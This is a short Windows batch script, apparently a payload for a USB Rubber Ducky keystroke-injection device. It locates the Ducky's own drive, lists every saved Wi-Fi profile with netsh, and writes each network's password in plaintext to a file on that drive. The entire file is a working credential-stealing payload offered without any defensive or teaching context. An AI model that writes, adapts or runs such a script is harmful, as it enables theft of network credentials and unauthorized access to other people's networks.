@echo off
:: Automatically finds the drive letter where inject.bin lives
for %%i in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist "%%i:\inject.bin" set "ducky=%%i:"
)

:: Enumerates all Wi-Fi profiles and plaintext keys, saving them to wifi_passwords.txt on the Ducky
(
    for /f "tokens=2 delims=:" %%a in ('netsh wlan show profiles ^| findstr /c:"All User Profile"') do (
        for /f "tokens=*" %%b in ("%%a") do (
            echo === SSID: %%b ===
            netsh wlan show profile name="%%b" key=clear | findstr /c:"Key Content"
            echo.
        )
    )
) > "%ducky%\wifi_passwords.txt"
exit